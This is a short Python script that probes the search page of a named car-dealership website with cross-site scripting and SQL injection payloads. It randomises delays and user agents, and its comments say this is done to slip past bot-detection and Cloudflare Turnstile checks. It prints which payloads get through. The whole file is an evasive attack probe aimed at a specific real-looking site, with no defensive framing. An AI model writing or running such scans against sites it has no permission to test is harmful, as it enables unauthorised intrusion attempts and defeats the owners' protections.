import requests
import time
import random

target_url = "http://www.montcalmautosales.com/search"
# Mimicking the Google Cloud IP and behavior found in your logs
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

def stealth_scan():
    session = requests.Session()
    # Payloads identified from your scan results
    payloads = ["<script>alert(1)</script>", "' OR 1=1--", "admin"]
    
    for payload in payloads:
        # Mimic human 'thinking' time to bypass Quantum Metric/Arkose
        delay = random.uniform(8, 20)
        print(f"[*] Human-emulation delay: {delay:.2f}s for payload: {payload}")
        time.sleep(delay)
        
        try:
            params = {'q': payload}
            response = session.get(target_url, params=params, headers={'User-Agent': random.choice(user_agents)})
            if response.status_code == 200:
                print(f"[+] Request passed Cloudflare Turnstile for: {payload}")
        except Exception as e:
            print(f"[X] Connection Reset: {e}")

if __name__ == "__main__":
    stealth_scan()
